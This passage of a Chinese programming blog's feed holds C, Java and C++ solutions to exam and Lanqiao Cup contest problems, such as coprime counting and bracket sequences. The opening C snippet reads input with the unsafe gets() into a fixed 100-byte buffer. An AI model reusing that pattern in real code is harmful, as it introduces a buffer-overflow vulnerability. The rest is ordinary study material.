class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>,j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> str1[N];</span><br><span class="line">    <span class="keyword">char</span> str2[N];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入字符串（长度不超过%d个）"</span>,N);</span><br><span class="line">    gets(str1);</span><br><span class="line">    <span class="keyword">while</span> (str1[i] != <span class="string">'\0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str1[i] &gt;= <span class="string">'0'</span> &amp;&amp; str1[i] &lt;= <span class="string">'9'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        str2[j++] = str1[i];</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    str2[j] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"结果为：\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,str2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;单项选择题&quot;&gt;&lt;a href=&quot;#单项选择题&quot; class=&quot;headerlink&quot; title=&quot;单项选择题&quot;&gt;&lt;/a&gt;单项选择题&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;设整型变量x，y的值分别为0，1, 那么x || y的结果是&lt;br&gt;A. 0&lt;br&gt;B. 1&lt;br&gt;C.
      
    
    </summary>
    
      <category term="考研" scheme="https://blog.zimo.wiki/categories/%E8%80%83%E7%A0%94/"/>
    
    
      <category term="考研" scheme="https://blog.zimo.wiki/tags/%E8%80%83%E7%A0%94/"/>
    
      <category term="807" scheme="https://blog.zimo.wiki/tags/807/"/>
    
      <category term="程序综合设计" scheme="https://blog.zimo.wiki/tags/%E7%A8%8B%E5%BA%8F%E7%BB%BC%E5%90%88%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="c语言" scheme="https://blog.zimo.wiki/tags/c%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>2019年第十一届蓝桥杯校内选拔赛JavaB组题解</title>
    <link href="https://blog.zimo.wiki/posts/4a4a9225/"/>
    <id>https://blog.zimo.wiki/posts/4a4a9225/</id>
    <published>2019-11-19T02:41:06.000Z</published>
    <updated>2022-05-04T02:56:01.374Z</updated>
    
    <content type="html"><![CDATA[<p>一共十个题，都比较好做</p><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><blockquote><p>问题描述<br>　　在计算机存储中，15.125GB是多少MB？</p></blockquote><p>答案：<code>15488</code><br>思路：1GB=1024MB<br>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo01</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="number">15.125</span> * <span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="number">15.125</span> * <span class="number">1024</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><blockquote><p>问题描述<br>　　不超过19000的正整数中，与19000互质的数的个数是多少？</p></blockquote><p>答案：<code>7200</code><br>思路：两个数互质，那么它们的最大公约数是1<br>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">19000</span>;i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (gcd(i,<span class="number">19000</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">ans++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> gcd(b,a % b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> gcd(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">19000</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (gcd(i, <span class="number">19000</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">ans++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><blockquote><p>问题描述<br>　　一个包含有2019个结点的二叉树，最少有多少层？<br>　　注意当一棵二叉树只有一个结点时为一层。</p></blockquote><p>答案：<code>11</code><br>思路：满二叉树层数最少，而满二叉树第一层节点数是1，第二层节点数是2，第三层节点数是4，，，以此类推，第n层节点数是2的n-1次方，于是这题目就变成了1+2+4+…+2<sup>n-1</sup>&gt;2019<br>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo03</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> d = <span class="number">1</span>;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; Integer.MAX_VALUE;i++) &#123;</span><br><span class="line">a += Math.pow(<span class="number">2</span>, i);</span><br><span class="line">System.out.println(d + <span class="string">","</span> + a);</span><br><span class="line"><span class="keyword">if</span> (a &gt;= <span class="number">2019</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">d++;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(d);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> d = <span class="number">1</span>;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; INT_MAX; i++) &#123;</span><br><span class="line">a += <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line"><span class="comment">//        cout &lt;&lt; d &lt;&lt; "," &lt;&lt; a &lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">if</span> (a &gt;= <span class="number">2019</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">d++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; d &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h2><blockquote><p>问题描述<br>　　由1对括号，可以组成一种合法括号序列：()。<br>　　由2对括号，可以组成两种合法括号序列：()()、(())。<br>　　由4对括号组成的合法括号序列一共有多少种？</p></blockquote><p>答案：<code>14</code><br>思路：对四对括号，先用回溯法全排列，然后set暴力去重，最后用stack验证是否合法<br>代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo04</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> HashSet&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">String s = <span class="string">"(((())))"</span>;</span><br><span class="line"><span class="comment">// 回溯法全排列，set暴力去重，stack验证是否合法</span></span><br><span class="line">dfs(s.toCharArray(),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (String str : set) &#123;</span><br><span class="line"><span class="keyword">if</span> (judge(str)) &#123;</span><br><span class="line">ans++;</span><br><span class="line">System.out.println(str);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">judge</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">Stack&lt;Character&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; str.length();i++) &#123;</span><br><span class="line"><span class="keyword">char</span> c = str.charAt(i);</span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">'('</span>) &#123;</span><br><span class="line">stack.push(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">')'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (stack.isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">stack.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b &gt;= a.length) &#123;</span><br><span class="line">String s = <span class="keyword">new</span> String(a);</span><br><span class="line">set.add(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = b;i &lt; a.length;i++) &#123;</span><br><span class="line">&#123;<span class="keyword">char</span> t = a[i];a[i] = a[b];a[b] = t;&#125;</span><br><span class="line">dfs(a, b + <span class="number">1</span>);</span><br><span class="line">&#123;<span class="keyword">char</span> t = a[i];a[i] = a[b];a[b] = t;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&lt;<span class="built_in">string</span>&gt; se;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">string</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b &gt;= n) &#123;</span><br><span class="line">se.insert(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = b; i &lt; n; i++) &#123;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> t = a[i];</span><br><span class="line">a[i] = a[b];</span><br><span class="line">a[b] = t;</span><br><span class="line">&#125;</span><br><span class="line">dfs(a, b + <span class="number">1</span>, n);</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> t = a[i];</span><br><span class="line">a[i] = a[b];</span><br><span class="line">a[b] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="built_in">string</span> str, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line"><span class="keyword">char</span> c = str[i];</span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">'('</span>) &#123;</span><br><span class="line">left++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">')'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (left == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">left--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> left == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">string</span> s = <span class="string">"(((())))"</span>;</span><br><span class="line"></span><br><span class="line">dfs(s, <span class="number">0</span>, s.length());</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&lt;<span class="built_in">string</span>&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span> (it = se.begin(); it != se.end(); it++) &#123;</span><br><span class="line"><span class="keyword">if</span> (judge(*it, s.length())) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ans++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目5"><a href="#题目5" class="headerlink" title="题目5"></a>题目5</h2><blockquote><p>问题描述<br>　　在数列 a[1], a[2], …, a[n] 中，如果对于下标 i, j, k 满足 0&lt;i&lt;j&lt;k&lt;n+1 且 a[i]&lt;a[j]&lt;a[k]，则称 a[i], a[j], a[k] 为一组递增三元组，a[j]为递增三元组的中心。<br>　　给定一个数列，请问数列中有多少个元素可能是递增三元组的中心。<br>    输入格式<br>    　　输入的第一行包含一个整数 n。<br>    　　第二行包含 n 个整数 a[1], a[2], …, a[n]，相邻的整数间用空格分隔，表示给定的数列。<br>    输出格式<br>    　　输出一行包含一个整数，表示答案。<br>    样例输入<br>    5<br>    1 2 5 3 5<br>    样例输出<br>    2<br>    样例说明<br>    　　a[2] 和 a[4] 可能是三元组的中心。</p></blockquote><p>思路：暴力计数<br>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo05</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> n = input.nextInt();</span><br><span class="line"><span class="keyword">int</span> a[] = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line">a[i] = input.nextInt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line">l:<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; n ;j++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = j + <span class="number">1</span>;k &lt; n;k++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] &lt; a[j] &amp;&amp; a[j] &lt; a[k]) &#123;</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">break</span> l;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(ans);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = 